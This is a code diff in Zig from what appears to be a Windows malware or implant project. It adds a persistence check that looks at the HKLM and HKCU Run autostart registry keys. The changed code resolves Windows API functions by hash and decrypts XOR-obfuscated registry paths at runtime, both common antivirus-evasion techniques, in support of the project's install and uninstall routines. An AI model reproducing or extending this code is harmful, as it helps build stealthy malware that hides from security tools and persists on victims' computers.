@@ -58,7 +58,7 @@ fn setRegistryString(hkey: types.HANDLE, subkey: []const u8, value_name: []const
     var key: types.HANDLE = undefined;
     const cr_status = RegCreateKeyExWFn(hkey, subkey_us[0 .. i + 1 :0], 0, null, 0, 0x02000000, null, &key, null);
     if (cr_status != 0) return false;
-    var val_bytes: [1024]u8 = undefined;
+    var val_bytes: [1024]u8 = [_]u8{0} ** 1024;
     for (value, 0..) |c, k| {
         if (k < val_bytes.len - 2) {
             val_bytes[k * 2] = c;
@@ -117,6 +117,33 @@ pub fn uninstall() bool {
 }
 
 pub fn isInstalled() bool {
+    const advapi32 = loadAdvapi32() orelse return false;
+    const RegOpenKeyExW = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegOpenKeyExW")) orelse return false;
+    const RegCloseKey = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegCloseKey")) orelse return false;
+    const RegOpenKeyExWFn: *const fn (hkey: types.HANDLE, subkey: ?[*:0]const u16, options: u32, access: u32, result: *types.HANDLE) callconv(.winapi) u32 = @ptrCast(@alignCast(RegOpenKeyExW));
+    const RegCloseKeyFn: *const fn (key: types.HANDLE) callconv(.winapi) u32 = @ptrCast(@alignCast(RegCloseKey));
+
+    var tmp_hklm: [E.hklm_run.len]u8 = undefined;
+    var tmp_hkcu: [E.hkcu_run.len]u8 = undefined;
+    hash.xorDecrypt(&E.hklm_run, &tmp_hklm);
+    hash.xorDecrypt(&E.hkcu_run, &tmp_hkcu);
+
+    var subkey_us: [512]u16 = undefined;
+    inline for (.{ tmp_hklm[0..], tmp_hkcu[0..] }) |subkey| {
+        var i: usize = 0;
+        while (i < subkey.len and i < 511) : (i += 1) subkey_us[i] = subkey[i];
+        subkey_us[i] = 0;
+
+        var key: types.HANDLE = undefined;
+        if (RegOpenKeyExWFn(HKCU, subkey_us[0 .. i + 1 :0], 0, 0x02000000, &key) == 0) {
+            _ = RegCloseKeyFn(key);
+            return true;
+        }
+        if (RegOpenKeyExWFn(HKLM, subkey_us[0 .. i + 1 :0], 0, 0x02000000, &key) == 0) {
+            _ = RegCloseKeyFn(key);
+            return true;
+        }
+    }
     return false;
 }
 
